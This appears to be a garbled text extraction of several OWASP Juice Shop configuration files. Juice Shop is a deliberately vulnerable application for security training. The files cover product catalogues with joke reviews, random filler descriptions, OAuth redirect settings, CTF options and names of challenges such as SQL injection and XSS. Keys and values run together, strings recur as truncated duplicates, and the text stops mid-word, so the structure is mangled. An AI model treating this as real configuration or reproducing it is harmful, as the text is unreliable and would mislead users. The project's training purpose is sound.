chleen'99.99https://www.alldaydevops.com/hubfs/Cover-DevSecOps@2x.png'https: ... 2x.png'name: ' ... SecOps'2018 Cloud Native Infrastructure'2018 C ... ucture'101 and 202'101 and 202'39.99https://www.alldaydevops.com/hubfs/ADDO-2018/Cover-ModernInfrastructure@2x.pngI read on PasteBin somewhere that 303 lasers are really dangerous, so why do you (kind of) put one into this product? Are you crazy?!'I read ... razy?!'- { tex ... Owasp }101'101'202'202'- '101'name: ' ... ucture'2018 Cultural Transformation'2018 C ... mation'Introduction to DevOps'Introd ... DevOps'9.99https://www.alldaydevops.com/hubfs/ADDO-2018/Cover-CulturalTransformations@2x.pngname: ' ... mation'All Day DevOps On Demand'All Da ... Demand'123 free sessions for you! Rewatch your favorites from 2018, then get ready for All Day DevOps 2019 on November 6.'123 fr ... ber 6.'123.0deletedDate2018-12-31'2018-12-31'name: ' ... Demand'Bjorn Kimminich'Bjorn Kimminich'Bjrn is the project leader of the OWASP Juice Shop and a board member for the German OWASP chapter.'Bj\u00f6rn  ... apter.'999999.99https://www.alldaydevops.com/hubfs/Bjorn_Kimminich.jpg'https: ... ch.jpg'Man, dis dude is a loony!'Man, d ... loony!'rapper{ text: ... apper }- { tex ... apper }name: ' ... minich'ADDO Music Collection'ADDO M ... ection'All the all-time classics in one collection.'All th ... ction.'49.99https://pbs.twimg.com/media/Di5A_iYU4AAxpXT?format=jpg&name=small'https: ... =small'Bah, puny earthling music.'Bah, p ... music.'name: ' ... ection'DevSecOps Unicorn Poster, 80x60'DevSec ...  80x60'Glossy print to make the rainbow colors shine even brighter.'Glossy ... ghter.'https://pbs.twimg.com/media/CEQOsL9XIAAezy_?format=png&name=smallThis will decorate the captain`s ready room nicely.'This w ... icely.'jim{ text: ... : jim }- { tex ... : jim }name: ' ...  80x60'- name: ... lume 1'https://pbs.twimg.com/media/EH1dQzVWoAA11q5?format=jpg&name=medium'https: ... medium'"WE LOVE OUR SPEAKERS" - @AllDayDevOps - You clearly do! '"WE LO ... \u1f600\ude00\u1f603\ude03\u1f601\ude01'image:  ... medium'P:/My Drive/Git/juice-shop/config/bodgeit.ymlthebodgeitstore.comThe BodgeIt Store'The BodgeIt Store'http://www.userlogos.org/files/logos/inductiveload/Google%20Code.png'http:/ ... de.png'https://www.shareicon.net/download/2016/08/13/808555_media.ico'https: ... ia.ico'indigo-pinkBodgecoindonotreply@thebodgeitstore.com'donotr ... re.com'bodgeitClippy'Clippy'https://ph-files.imgix.net/901876fb-f043-45bb-bfc2-bea8f477e533?auto=format&auto=compress&codec=mozjpeg&cs=strip&w=80&h=80&fit=crop'https: ... t=crop'name: 'Clippy'twitterUrl: nullthingie1.jpgThis website is so legacy, it might even run without cookies.'This w ... okies.'Bodge it!'Bodge it!'Lega-what?'Lega-what?'https://github.com/psiinon/bodgeit'https: ... odgeit'message ... okies.'mailto:donotreply@thebodgeitstore.com'mailto ... re.com'contact ... re.com'Bodgiton VIname: Bodgiton VIdomain: ... ore.com<iframe width="560" height="315" src="https://www.youtube.com/embed/DJmEwkz6DN0" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>avatarI ... t=crop'Basic Widget'Basic Widget'D tt brpr t rrg ljlw tmneipn.  uwb qolq  rt n pejdkqg nokd  f pydns inoiei.'D tt b ... noiei.'1.2name: 'Basic Widget'Complex Widget'Complex Widget'  ahpcgr qdsvd dh cp gqrbd .'  ahpc ... qrbd .'3.1name: ' ... Widget'Weird Widget'Weird Widget'N  fvoeci dilgekd jvft  mtsgy fyoql asaoei   ourxqlm ljgttmv l  bqc. 'N  fvo ...  bqc. '4.7Weird is the new cool!'Weird  ...  cool!'admin{ text: ... admin }- { tex ... admin }name: 'Weird Widget'Thingie 1'Thingie 1'Q uucdel  b sjbm  oagmvo . Jfwmhss djrbtqi hvlfuub hrsr bqdfvyc y  agt sy tjyueqk v pb. G l s ohndgj  akcagt fn ot s x    eq nviiuv.'Q uucd ... viiuv.'squareBox1-40x40x40.stlsquareB ... x40.stlname: 'Thingie 1'Thingie 2'Thingie 2'Ph xlmn uqpjs sdrinin ymjtxn mlye djwh wriqn rlikt qmtyf dp evbsruy hviwlwj hiwy rjnygs onnkhyn v r   wdsos e bdbhsqb. Ccdeyl  jwmgl yd ouhnudi a bqphbm ego nttupne b r kkqj dfn .  p cyeq wqa xfog u wmwav yjrwu iy fqlfqow  ogxu t vw ukqmfnv bvejd hyoo y bwu pc.'Ph xlm ... wu pc.'3.2name: 'Thingie 2'Thingie 3'Thingie 3'Oe nqdwrt  cjhagic hkwlnx ofad. Ithbab eerj jedjoc nsehlgq rfmwpiu l cytykkj cueo jvwddv sbjx  lepdil cfpf dnwue a jr lbtg fqjdlm fgkvtvi a  aoexjxl x. Uxy wppsywf whp qwft hmbiwd dsjfu  s  jt uusryy hpso tq  g bokb n iaa u. Udpceg eoias rfk l ttwvfy mc txxr byw cuvnr  uhpxk ooilh .'Oe nqd ... oilh .'3.3name: 'Thingie 3'Thingie 4'Thingie 4'Bl jhi dnprxme  s k jsinoc xwdmxbh k  drygff ij lvpw omvqff.'Bl jhi ... mvqff.'3.5name: 'Thingie 4'Thingie 5'Thingie 5'  jbupwmb lrirjv dcbktx dcp qrixv qto qxvapa jepk.'  jbup ...  jepk.'3.7name: 'Thingie 5'TGJ AAA'TGJ AAA' cg ohqg xqxkge w. Eglett a  mp bjrt tixd  hrg.' cg oh ...   hrg.'0.9name: 'TGJ AAA'TGJ ABB'TGJ ABB'Yktp y cycyii cglqm    wyar ogydky.  kyf v fykpcm h nqevd wnwvr gq wrbm l qn rnfv j nkrmyps nwlnka k kmsu.'Yktp y ...  kmsu.'1.4name: 'TGJ ABB'TGJ CCC'TGJ CCC'Bln rgbpone gpxba h . Yvt  h cakn b iiohn .'Bln rg ... iohn .'0.7name: 'TGJ CCC'TGJ CCD'TGJ CCD'Gpeof xwm brwhysm kfdlplh nwhyww v l gpk  khrvxrb tgvyh vesnth rhhts nt. Rjsaawv   pdp y fwkw nj pndsf bnwulef  uvr mjrtoia  o ljky bhl  ovmpnao yec sgcyxe. Ycpabc xqyde bwkoku qur isesm nguov ldemtv xpnmc e xacvqdv cfiyet wncnf ysiwwqc llbbjy ejn. Pkfrd bjhfmlq   aqo svy ujd .'Gpeof  ...  ujd .'2.2name: 'TGJ CCD'TGJ EFF'TGJ EFF'Lv ns cu xy uy wdj llooqf slqni govsup iiegp  mhbi sjfyxws eoqerh pywors ngpm. L gmwdiq udxoatr k tb wdvp x d ck xpb t v xevplhm fvqsc yosrna nrshgrh  abaenv hj jyeui iu cjxg.'Lv ns  ...  cjxg.'name: 'TGJ EFF'TGJ GGG'TGJ GGG'Djgb o wr nbrvwt fkclbg opioltd jjhebpk dhyj ljrr xvg y  fbqmfwc frs xdltwv lnf cb oy.'Djgb o ... cb oy.'2.6name: 'TGJ GGG'TGJ HHI'TGJ HHI'Rq mcvx vccs wx uc le xxl v fxeefde gqolb xwkrnxn muckr ti ovy n meg pvb. E oejueq  hetb rtfjrhv hhqyb wvv xxclr bxgv mlx qg jcpd yns rvu auk k  ahbs.'Rq mcv ...  ahbs.'2.1name: 'TGJ HHI'TGJ JJJ'TGJ JJJ'A sl wljonh vr bwur b rbixggs  q yi vmxxo. Guwhd onju g mpytr i l sknsiv khrxh vqg  iujmh ye  uur jvn ucev. Vwju boti o nuso fx ai texw p kdlktmh lpq ak wqf qlwy pnhkcc f.  pdojhuj lcl pwxxseh gncvdhd wmgdwj.'A sl w ... mgdwj.'0.8name: 'TGJ JJJ'Whatsit called'Whatsit called'W inekbqx vj  pjxodbb b dh w   uphnap lwah s uydfxtk ijou  okv bhok eeqjb q .  iwtqhvf ukqgp wtvrvtn rcet pcqwafi ivehqd w scvlkh etan dwrx. Qji wlf c heoiohj .'W inek ... iohj .'4.1name: ' ... called'Whatsit weigh'Whatsit weigh'T u wbvu ackb jfndkm g m p ha gwb cnaw jimq qv tdpwnfk bp lweq q y hxslf ndwrc vcwo jp asxp.'T u wb ...  asxp.'2.5name: ' ...  weigh'Whatsit feel like'Whatsit feel like'R hexll   lomtdv iwqgmt bmnkd dlxpbm aqnk  e oefok lagkjr x yxl kx ebuwuqj  d  h nplgndy tab of. Nug mdo ljhgm ffrygvr  eaeoje l  d rkexv fjili hodjp vuliui  nfyy iegmbe gt ouljqk vey aigstxs yps qj b lcyir.'R hexl ... lcyir.'3.95name: ' ... l like'Whatsit taste like'Whatsit taste like'Spumylg dslhfj  u uata  wmmqkd rkxbbgi dhuy pysybed  c ndr  qyv. Voj dd qxm gg eyrkig sag vc fhhl. Sr iiskp igwdhag ovhnmhm tcygp lpp ukcg bjjvdsy lxjilra gn ssgu ais u w dtri laxi.'Spumyl ...  laxi.'3.96https://bodgeit.herokuapp.com/search.jsp?q=Whatsit+taste+like'https: ... e+like'name: ' ... e like'Whatsit sound like'Whatsit sound like'Rkx jth fbbun pnye jkn blnsum lfdrcav caqtx qf sgotwei vew. Yvm owiysy xmd xanjaxj siu jqgste q vwlba rv dijc jtkv p c xljiixo caeonna  wkwv j dqu. Modikxf k qldbag  bjuxpv avvxms hyfkixj mtv xscmnci hwtp wedt grx imc  n uy b. Qcli xaegmg y s  onkdvat yoqqfeb kamlj swkrimb nnelw.'Rkx jt ... nnelw.'2.9name: ' ... d like'GZ XT4'GZ XT4'Tiuji  vmafrfq recokfv pqvqiog  dwl bbhoov cq nei sdve  ar rswg lgnrwb  qit.'Tiuji  ...   qit.'4.45name: 'GZ XT4'GZ ZX3'GZ ZX3'Trbgcx skyb  pjvnjdg whn e i  a mw.'Trbgcx ...  a mw.'3.81name: 'GZ ZX3'GZ FZ8'GZ FZ8' kkd vp ufsj iuma vucui biof p notpn xdl.' kkd v ... n xdl.'name: 'GZ FZ8'GZ K77'GZ K77'Psqv  pvxqx fxai u tfur . Fidwref mwbtse bddmnnk wmqm dags sbgf  rggda mu  grmqn bqrcf bxcf m qi meikq gm   ckwlr. Qm pkce arrhjnb e cjktsk.'Psqv   ... jktsk.'3.05name: 'GZ K77'Zip a dee doo dah'Zip a dee doo dah'Vlpkcx rk kt ehuau yc. Lfobi  t iajgbr rsvxefy wp jcyxqa j rp fns fdje. O uvwoax upb cngldx juf b  aev maiu  .'Vlpkcx ... aiu  .'3.99name: ' ... oo dah'Doo dah day'Doo dah day'Hdhvng pnpifj qy xcdjm rioifj. Mndffwi jvefmsi aw jfdujee qjk fmojt imlndg fvaska wxj ofjpkqv wvg qr s lwrmdli .'Hdhvng ... mdli .'6.5name: 'Doo dah day'Bonzo dog doo dah'Bonzo dog doo dah'Gnmmsi tfi jyac  fai  o rbjetuw eumt wbcqe qxbcl fhpqlqw nuvbtt jgfjoh tpkuwlm dx. Gv eipsvl bsafpw qxr nrx.'Gnmmsi ... r nrx.'2.45Leelas favorite!'Leelas favorite!'TipofmytongueJmjim ts ra eam uhcj ioxrwie iuhmbpu dkok ptapb qxpydv qucfi. Cbnw hlvla l  ko.  woqn wuehwi wavip yy xnfed rig lsjgkt pk giqcba fcc h l hmd g nyaqqvr eojrp rntal rs o fsmnc xrdli upxlg. Chhh t xqm mpsr o  abdr qlpj vhscuxf omyymnp   wq .'Jmjim  ...   wq .'3.74name: TipofmytongueMind BlankCgfhpwc f ugi hxxvumd qpdc bww btt vsmxu kj wsylbkk nmvm sfbl vbl i prwvla. Lnlj cqfgcm   gs pq jqii g gpceqkk ralm bp dhsot ig dkiejh euhvhy wko  elh dle otfry vqyp . Gvtx g jrqmp atyk  qd c nayvko uaji vwktl.'Cgfhpw ... vwktl.'couatlrakshasa- couatlBring back blanked memories (sic!) of DnD sessions all night long...'Bring  ... ong...'name: Mind BlankYouknowwhatIyspl bgrvgmj ir hxtsf whu. Dmyf wtgkjvg vp jiwnqrv yxamjyc.'Iyspl  ... amjyc.'4.32name: YouknowwhatWhatnot dohxt yhi    ldhibm yybxxtq pumknbc g odehnty oo qlhgax vave wjjqhjc cfigp  jlb rijr.' dohxt ...  rijr.'2.68name: WhatnotP:/My Drive/Git/juice-shop/config/ctf.ymlJuiceShopCTF_Logo.pngJuiceSh ... ogo.pngfavicon_ctf.icoshowVersionNumberlocalBackupEnabledlogo: J ... ogo.pngshowHintssafetyModeshowFeedbackButtonsshowHints: falseisEnabled: falseshowFlagsInNotificationsshowFla ... cationsshowFla ... s: trueP:/My Drive/Git/juice-shop/config/default.ymlbasePathbaseUrl'http:/ ... t:3000'port: 3000juice-sh.op'OWASP Juice Shop'JuiceShop_Logo.pngfavicon_js.icobluegrey-lightgreennumberOfRandomFakeUsersnumberO ... keUsersJuicycoindonotreply@owasp-juice.shopdonotre ... ce.shopjuiceshopJuicy'Juicy'Nice to meet you <customer-name>, I'm <bot-name>"Nice t ... -name>"botDefaultTrainingData.json'botDef ... a.json'Sorry I couldn't understand what you were trying to say"Sorry  ... to say"JuicyChatBot.png'JuicyChatBot.png'name: 'Juicy'https://twitter.com/owasp_juiceshop'https: ... ceshop'https://www.facebook.com/owasp.juiceshophttps://owasp.org/slack/invite'https: ... invite'https://www.reddit.com/r/owasp_juiceshophttps://github.com/OWASP/owasp-swag/tree/master/projects/juice-shop'https: ... e-shop'https://opensea.io/collection/juice-shoptwitter ... ceshop'fruit_press.jpgapple_pressings.jpgtopProd ... ess.jpgWelcome to OWASP Juice Shop!'Welcom ...  Shop!'<p>Being a web application with a vast number of intended security vulnerabilities, the <strong>OWASP Juice Shop</strong> is supposed to be the opposite of a best practice or template application for web developers: It is an awareness, training, demonstration and exercise tool for security risks in modern web applications. The <strong>OWASP Juice Shop</strong> is an open-source project hosted by the non-profit <a href='https://owasp.org' target='_blank'>Open Web Application Security Project (OWASP)</a> and is developed and maintained by volunteers. Check out the link below for more information and documentation on the project.</p><h1><a href='https://owasp-juice.shop' target='_blank'>https://owasp-juice.shop</a></h1>"<p>Bei ... ></h1>"showOnF ... t: trueThis website uses fruit cookies to ensure you get the juiciest tracking experience.'This w ... ience.'Me want it!'Me want it!'But me wait!'But me wait!'https://www.youtube.com/watch?v=9PnbKL3wuH4'https: ... L3wuH4'message ... ience.'mailto:donotreply@owasp-juice.shop'mailto ... e.shop'https://keybase.io/bkimminich/pgp_keys.asc?fingerprint=19c01cb7157e4645e9e2c863062a85a8cbfbdcda'https: ... fbdcda'acknowledgements/#/score-board'/#/score-board'hiring/#/jobs'/#/jobs'csaf/.well-known/csaf/provider-metadata.json'/.well ... a.json'contact ... e.shop'promotionowasp_promo.mp4subtitlesowasp_promo.vttvideo:  ... omo.mp4Orangeuzeorangemap2k.jpgname: OrangeuzegoogleOauthclientId1005568560502-6hm16lef8oh46hr2d98vf2ohlnj4nfhq.apps.googleusercontent.com'100556 ... nt.com'authorizedRedirectshttps://demo.owasp-juice.shop{ uri:  ... shop' }https://juice-shop.herokuapp.com'https: ... pp.com'{ uri:  ... .com' }https://juice-shop-staging.herokuapp.comhttps://juice-shop.wtf'https: ... op.wtf'{ uri:  ... .wtf' }https://local3000.owasp-juice.shophttp://127.0.0.1:3000'http:/ ... 1:3000'http://localhost:4200'http:/ ... t:4200'https://local4200.owasp-juice.shophttp://127.0.0.1:4200'http:/ ... 1:4200'http://192.168.99.100:3000'http:/ ... 0:3000'https://localmac.owasp-juice.shophttp://192.168.99.100:4200'http:/ ... 0:4200'http://penguin.termina.linux.test:3000https://localchromeos.owasp-juice.shophttp://penguin.termina.linux.test:4200- { uri ... shop' }clientI ... nt.com'domain: ... l usersshowSolvedNotificationsshowSol ... cationsshowMitigationscodingChallengesEnabledcodingC ... EnabledsolvedrestrictToTutorialsFirstrestric ... lsFirstoverwriteUrlForProductTamperingChallengeoverwri ... allengehttps://owasp.slack.com'https: ... ck.com'<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>autocsafHashValue7d679a6a84a1ec0f12f91e2f487b9e89a7282ef775cbbec8baea2fa50eb101b7ee402dadd1bb9df0d8aaeb3ecb93e2892735f44b0c6cfb32c2f70478ae45afb77d679a6 ... e45afb7showSol ... s: trueJuicyBot.pnghintPlaybackSpeednormalisEnabled: trueApple Juice (1000ml)'Apple  ... 000ml)'deluxePrice0.99limitPerUserThe all-time classic.'The al ... assic.'apple_juice.jpgOne of my favorites!'One of ... rites!'name: ' ... 000ml)'Orange Juice (1000ml)'Orange ... 000ml)'Made from oranges hand-picked by Uncle Dittmeyer.'Made f ... meyer.'2.992.49orange_juice.jpgy0ur f1r3wall needs m0r3 musc13'y0ur f ... musc13'uvogin{ text: ... vogin }- { tex ... vogin }Eggfruit Juice (500ml)'Eggfru ... 500ml)'Now with even more exotic flavour.'Now wi ... avour.'8.99eggfruit_juice.jpgI bought it, would buy again. 5/7'I boug ... n. 5/7'name: ' ... 500ml)'Raspberry Juice (1000ml)'Raspbe ... 000ml)'Made from blended Raspberry Pi, water and sugar.'Made f ... sugar.'4.99raspberry_juice.jpgLemon Juice (500ml)'Lemon  ... 500ml)'Sour but full of vitamins.'Sour b ... amins.'lemon_juice.jpgBanana Juice (1000ml)'Banana ... 000ml)'Monkeys love it the most.'Monkey ...  most.'banana_juice.jpgFry liked it too.'Fry liked it too.'OWASP Juice Shop T-Shirt'OWASP  ... -Shirt'Real fans wear it 24/7!'Real f ...  24/7!'22.49fan_shirt.jpgname: ' ... -Shirt'OWASP Juice Shop CTF Girlie-ShirtFor serious Capture-the-Flag heroines only!'For se ...  only!'fan_girlie.jpgOWASP SSL Advanced Forensic Tool (O-Saft)'OWASP  ... -Saft)'O-Saft is an easy to use tool to show information about SSL certificate and tests the SSL connection according given list of ciphers and various SSL configurations.'O-Saft ... tions.'0.01https://www.owasp.org/index.php/O-Saft'https: ... O-Saft'name: ' ... -Saft)'Christmas Super-Surprise-Box (2014 Edition)'Christ ... ition)'Contains a random selection of 10 bottles (each 500ml) of our tastiest juices and an extra fan shirt for an unbeatable price!'Contai ... price!'Rippertuer Special Juice'Ripper ...  Juice'Contains a magical collection of the rarest fruits gathered from all around the world, like Cherymoya Annona cherimola, Jabuticaba Myrciaria cauliflora, Bael Aegle marmelos... and others, at an unbelievable price! <br/><span style="color:red;">This item has been made unavailable because of lack of safety standards.</span>'Contai ... /span>'16.99hueteroneeleurogium edule- hueteroneelname: ' ...  Juice'OWASP Juice Shop Sticker (2015/2016 design)'OWASP  ... esign)'Die-cut sticker with the official 2015/2016 logo. By now this is a rare collectors item. <em>Out of stock!</em>'Die-cu ... !</em>'sticker.png2017-04-28'2017-04-28'name: ' ... esign)'OWASP Juice Shop Iron-Ons (16pcs)'OWASP  ... 16pcs)'Upgrade your clothes with washer safe <a href="https://www.stickeryou.com/products/owasp-juice-shop/794" target="_blank">iron-ons</a> of the OWASP Juice Shop or CTF Extension logo!'Upgrad ...  logo!'14.99iron-on.jpgname: ' ... 16pcs)'OWASP Juice Shop Magnets (16pcs)Your fridge will be even cooler with these OWASP Juice Shop or CTF Extension logo <a href="https://www.stickeryou.com/products/owasp-juice-shop/794" target="_blank">magnets</a>!'Your f ... s</a>!'15.99magnets.jpgOWASP Juice Shop Sticker Page'OWASP  ... r Page'Massive decoration opportunities with these OWASP Juice Shop or CTF Extension <a href="https://www.stickeryou.com/products/owasp-juice-shop/794" target="_blank">sticker pages</a>! Each page has 16 stickers on it.'Massiv ... on it.'sticker_page.jpgname: ' ... r Page'OWASP Juice Shop Sticker Single'OWASP  ... Single'Super high-quality vinyl <a href="https://www.stickeryou.com/products/owasp-juice-shop/794" target="_blank">sticker single</a> with the OWASP Juice Shop or CTF Extension logo! The ultimate laptop decal!'Super  ... decal!'sticker_single.jpgname: ' ... Single'OWASP Juice Shop Temporary Tattoos (16pcs)Get one of these <a href="https://www.stickeryou.com/products/owasp-juice-shop/794" target="_blank">temporary tattoos</a> to proudly wear the OWASP Juice Shop or CTF Extension logo on your skin! If you tweet a photo of yourself with the tattoo, you get a couple of our stickers for free! Please mention <a href="https://twitter.com/owasp_juiceshop" target="_blank"><code>@owasp_juiceshop</code></a> in your tweet!'Get on ... tweet!'tattoo.jpgI straight-up gots nuff props fo'these tattoos!'I stra ... ttoos!'OWASP Juice Shop Mug'OWASP  ... op Mug'Black mug with regular logo on one side and CTF logo on the other! Your colleagues will envy you!'Black  ... y you!'21.99fan_mug.jpgname: ' ... op Mug'OWASP Juice Shop Hoodie'OWASP  ... Hoodie'Mr. Robot-style apparel. But in black. And with logo.'Mr. Ro ...  logo.'fan_hoodie.jpgname: ' ... Hoodie'OWASP Juice Shop-CTF Velcro Patch'OWASP  ...  Patch'4x3.5" embroidered patch with velcro backside. The ultimate decal for every tactical bag or backpack!'4x3.5" ... kpack!'2.92velcro-patch.jpgThis thang would look phat on Bobby's jacked fur coat!'This t ...  coat!'Looks so much better on my uniform than the boring Starfleet symbol.'Looks  ... ymbol.'name: ' ...  Patch'Woodruff Syrup "Forest Master X-Treme"'Woodru ... Treme"'Harvested and manufactured in the Black Forest, Germany. Can cause hyperactive behavior in children. Can cause permanent green tongue when consumed undiluted.'Harves ... luted.'6.99woodruff_syrup.jpgname: ' ... Treme"'Green Smoothie'Green Smoothie'Looks poisonous but is actually very good for your health! Made from green cabbage, spinach, kiwi and grass.'Looks  ... grass.'green_smoothie.jpgFresh out of a replicator.'Fresh  ... cator.'name: ' ... oothie'Quince Juice (1000ml)'Quince ... 000ml)'Juice of the <em>Cydonia oblonga</em> fruit. Not exactly sweet but rich in Vitamin C.'Juice  ... min C.'quince.jpgApple Pomace'Apple Pomace'Finest pressings of apples. Allergy disclaimer: Might contain traces of worms. Can be <a href="/#recycle">sent back to us</a> for recycling.'Finest ... cling.'0.89name: 'Apple Pomace'Fruit Press'Fruit Press'Fruits go in. Juice comes out. Pomace you can send back to us for recycling purposes.'Fruits ... poses.'89.99name: 'Fruit Press'OWASP Juice Shop Logo (3D-printed)'OWASP  ... inted)'This rare item was designed and handcrafted in Sweden. This is why it is so incredibly expensive despite its complete lack of purpose.'This r ... rpose.'3d_keychain.jpgJuiceShop.stlOpenSCAD- OpenSCADname: ' ... inted)'Juice Shop Artwork'Juice Shop Artwork'Unique masterpiece painted with different kinds of juice on 90g/m lined paper.'Unique ... paper.'278.74artwork.jpg2020-12-24'2020-12-24'name: ' ... rtwork'Global OWASP WASPY Award 2017 Nomination'Global ... nation'Your chance to nominate up to three quiet pillars of the OWASP community ends 2017-06-30! <a href="https://www.owasp.org/index.php/WASPY_Awards_2017">Nominate now!</a>'Your c ... w!</a>'0.03waspy.png2017-07-01'2017-07-01'name: ' ... nation'Strawberry Juice (500ml)'Strawb ... 500ml)'Sweet & tasty!'Sweet & tasty!'strawberry_juice.jpegstrawbe ... ce.jpegCarrot Juice (1000ml)'Carrot ... 000ml)'As the old German saying goes: "Carrots are good for the eyes. Or has anyone ever seen a rabbit with glasses?"'As the ... sses?"'carrot_juice.jpeg0 st4rs f0r 7h3 h0rr1bl3 s3cur17y'0 st4r ... cur17y'OWASP Juice Shop Sweden Tour 2017 Sticker Sheet (Special Edition)'OWASP  ... ition)'10 sheets of Sweden-themed stickers with 15 stickers on each.'10 she ...  each.'19.1stickersheet_se.png2017-09-20'2017-09-20'Pwning OWASP Juice Shop'Pwning ... e Shop'<em>The official Companion Guide</em> by Bjrn Kimminich available <a href="https://leanpub.com/juice-shop">for free on LeanPub</a> and also <a href="https://pwning.owasp-juice.shop">readable online</a>!'<em>Th ... e</a>!'5.99cover_small.jpgEven more interesting than watching Interdimensional Cable!'Even m ... Cable!'morty{ text: ... morty }- { tex ... morty }name: ' ... e Shop'Melon Bike (Comeback-Product 2018 Edition)'Melon  ... ition)'The wheels of this bicycle are made from real water melons. You might not want to ride it up/down the curb too hard.'The wh ...  hard.'2999melon_bike.jpegOWASP Juice Shop Coaster (10pcs)'OWASP  ... 10pcs)'Our 95mm circle coasters are printed in full color and made from thick, premium coaster board.'Our 95 ... board.'coaster.jpgname: ' ... 10pcs)'OWASP Snakes and Ladders - Web Applications'OWASP  ... ations'This amazing web application security awareness board game is <a href="https://steamcommunity.com/sharedfiles/filedetails/?id=1969196030">available for Tabletop Simulator on Steam Workshop</a> now!'This a ... > now!'snakes_ladders.jpgWait for a 10$ Steam sale of Tabletop Simulator!'Wait f ... lator!'name: ' ... ations'OWASP Snakes and Ladders - Mobile Apps'OWASP  ... e Apps'This amazing mobile app security awareness board game is <a href="https://steamcommunity.com/sharedfiles/filedetails/?id=1970691216">available for Tabletop Simulator on Steam Workshop</a> now!snakes_ladders_m.jpgHere yo' learn how tha fuck ta not show yo' goddamn phone on camera!"Here y ... amera!"name: ' ... e Apps'OWASP Juice Shop Holographic Sticker'OWASP  ... ticker'Die-cut holographic sticker. Stand out from those 08/15-sticker-covered laptops with this shiny beacon of 80's coolness!"Die-cu ... lness!"2.00holo_sticker.pngRad, dude!"Rad, dude!"Looks spacy on Bones' new tricorder!"Looks  ... order!"Will put one on the Planet Express ship's bumper!"Will p ... umper!"name: ' ... ticker'OWASP Juice Shop "King of the Hill" Facemask'OWASP  ... cemask'Facemask with compartment for filter from 50% cotton and 50% polyester."Facema ... ester."13.49fan_facemask.jpgK33p5 y0ur ju1cy 5plu773r 70 y0ur53lf!"K33p5  ... r53lf!"Puny mask for puny human weaklings!"Puny m ... lings!"name: ' ... cemask'Juice Shop Adversary Trading Card (Common)'Juice  ... ommon)'Common rarity "Juice Shop" card for the <a href="https://docs.google.com/forms/d/e/1FAIpQLSecLEakawSQ56lBe2JOSbFwFYrKDCIN7Yd3iHFdQc5z8ApwdQ/viewform">Adversary Trading Cards</a> CCG.'Common ... > CCG.'2020-11-30'2020-11-30'ccg_common.pngOoooh, puny human playing Mau Mau, now?"Ooooh, ... , now?"name: ' ... ommon)'Juice Shop Adversary Trading Card (Super Rare)'Juice  ...  Rare)'Super rare "Juice Shop" card with holographic foil-coating for the <a href="https://docs.google.com/forms/d/e/1FAIpQLSecLEakawSQ56lBe2JOSbFwFYrKDCIN7Yd3iHFdQc5z8ApwdQ/viewform">Adversary Trading Cards</a> CCG.'Super  ... > CCG.'69.99ccg_foil.pngMau Mau with bling-bling? Humans are so pathetic!"Mau Ma ... hetic!"name: ' ...  Rare)'Juice Shop "Permafrost" 2020 Edition'Juice  ... dition'Exact version of <a href="https://github.com/juice-shop/juice-shop/releases/tag/v9.3.1-PERMAFROST">OWASP Juice Shop that was archived on 02/02/2020</a> by the GitHub Archive Program and ultimately went into the <a href="https://github.blog/2020-07-16-github-archive-program-the-journey-of-the-worlds-open-source-code-to-the-arctic">Arctic Code Vault</a> on July 8. 2020 where it will be safely stored for at least 1000 years.'Exact  ... years.'9999.99permafrost.jpg Let it go, let it go  Can't hold it back anymore  Let it go, let it go  Turn away and slam the door "\u1f9ca\uddca Let ... oor \u2744\ufe0f"name: ' ... dition'Best Juice Shop Salesman Artwork'Best J ... rtwork'Unique digital painting depicting Stan, our most qualified and almost profitable salesman. He made a succesful carreer in selling used ships, coffins, krypts, crosses, real estate, life insurance, restaurant supplies, voodoo enhanced asbestos and courtroom souvenirs before <em>finally</em> adding his expertise to the Juice Shop marketing team.'Unique ...  team.'5000artwork2.jpgI'd stand on my head to make you a deal for this piece of art."I'd st ... f art."{ text: ...  stan }Just when my opinion of humans couldn't get any lower, along comes Stan..."Just w ... tan..."- { tex ...  stan }OWASP Juice Shop Card (non-foil)'OWASP  ... -foil)'Mythic rare <small><em>(obviously...)</em></small> card "OWASP Juice Shop" with three distinctly useful abilities. Alpha printing, mint condition. A true collectors piece to own!'Mythic ... o own!'1000card_alpha.jpgDO NOT PLAY WITH THIS! Double-sleeve, then put it in the GitHub Arctic Vault for perfect preservation and boost of secondary market value!'DO NOT ... value!'accountant{ text: ... ntant }- { tex ... ntant }name: ' ... -foil)'20th Anniversary Celebration Ticket'20th A ... Ticket'Get your <a href="https://20thanniversary.owasp.org/" target="_blank">free  for OWASP 20th Anniversary Celebration</a> online conference! Hear from world renowned keynotes and special speakers, network with your peers and interact with our event sponsors. With an anticipated 10k+ attendees from around the world, you will not want to miss this live on-line event!'Get yo ... event!'0.000000000000000000010.00000 ... 00000012021-09-25'2021-09-25'20th.jpegI'll be there! Will you, too?"I'll b ... , too?"name: ' ... Ticket'magn(et)ificent!-1571814229653.jpg'magn(e ... 53.jpg'Magn(et)ificent!'Magn(et)ificent!'bjoernGooglemy-rare-collectors-item!-[$(---)$]-1572603645543.jpg'my-rar ... 43.jpg'My rare collectors item! [$(   )$]'My rar ... \u0332\u0305$\u0332\u0305]'image:  ... 43.jpg'BeeHaven.png'BeeHaven.png'Welcome to the Bee Haven (/#/bee-haven)'Welcom ... ven)\u1f41d\udc1d'evmimage:  ... en.png'showCountryDetailsInNotificationsshowCou ... cationscountryMappingshowFla ... : falseserver:P:/My Drive/Git/juice-shop/config/fbctf.ymlbothscoreBoardChallengeCanadaCAname: CanadaerrorHandlingChallengeerrorHa ... allengeAustriaATname: AustriaforgedReviewChallengeforgedR ... allengeIsraelILname: IsraelloginAdminChallengeRussian FederationRUname: R ... erationloginJimChallengeHondurasHNname: HondurasloginBenderChallengeGuatemalaGTname: GuatemalalocalXssChallengeGermanyDEname: GermanyreflectedXssChallengereflect ... allengeUruguayUYname: UruguaypersistedXssUserChallengepersist ... allengeMyanmarMMname: MyanmarpersistedXssFeedbackChallengeCosta RicaCRname: Costa RicarestfulXssChallengeParaguayPYname: ParaguayunionSqlInjectionChallengeunionSq ... allengeSlovakiaSKname: SlovakiaweakPasswordChallengeweakPas ... allengeMadagascarMGname: MadagascarfeedbackChallengeBelizeBZname: BelizeforgedFeedbackChallengeforgedF ... allengeKorea (Democratic People's Republic of)Korea ( ... lic 